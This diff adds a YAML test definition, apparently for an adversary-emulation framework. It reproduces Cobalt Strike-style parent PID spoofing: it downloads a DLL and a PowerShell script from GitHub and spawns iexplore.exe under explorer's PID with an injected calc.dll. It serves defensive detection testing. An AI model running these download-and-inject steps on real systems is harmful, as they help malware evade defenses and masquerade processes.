@@ -1,0 +1,62 @@
+api_version: "2.0"
+name: Parent PID Spoofing using PowerShell
+description: |
+    This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.
+    Upon execution, "Process C:\Program Files\Internet Explorer\iexplore.exe is spawned with pid ####" will be displayed and
+    calc.exe will be launched.
+
+    Credit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)
+args:
+    - name: dll_process_name
+      type: string
+      default: calculator
+    - name: dll_path
+      type: path
+      default: PathToAtomicsFolder\T1134.004\bin\calc.dll
+    - name: spawnto_process_name
+      type: string
+      default: iexplore
+    - name: parent_process_name
+      type: string
+      default: explorer
+    - name: spawnto_process_path
+      type: path
+      default: C:\Program Files\Internet Explorer\iexplore.exe
+uuid: 069258f4-2162-46e9-9a25-c9c6c56150d2
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1134: Access Token Manipulation'
+    subtechniques:
+        - 'T1134.004: Parent PID Spoofing'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        DLL to inject must exist on disk at specified location (#{dll_path})
+      inline: |
+        if (Test-Path "#{dll_path}") {exit 0} else {{New-Item -Type Directory (split-path "#{dll_path}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1134.004/bin/calc.dll" -OutFile "#{dll_path}"
+        }}
+      executor: powershell
+    - name: |
+        PPID.ps1 must exist on disk at $PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1
+      inline: |
+        if (Test-Path "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1") {exit 0} else {{New-Item -Type Directory (split-path "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1134.004/src/PPID-Spoof.ps1" -OutFile "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"
+        }}
+      executor: powershell
+    - name: parent-pid-spoofing-using-powershell
+      inline: |
+        . "$PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1"
+        $ppid=Get-Process {{.Args.parent_process_name}} | select -expand id
+        PPID-Spoof -ppid $ppid -spawnto "{{.Args.spawnto_process_path}}" -dllpath "{{.Args.dll_path}}"
+      executor: powershell
+      cleanup:
+        inline: |
+            Stop-Process -Name "{{.Args.dll_process_name}}" -ErrorAction Ignore
+            Stop-Process -Name "{{.Args.spawnto_process_name}}" -ErrorAction Ignore
+        executor: powershell
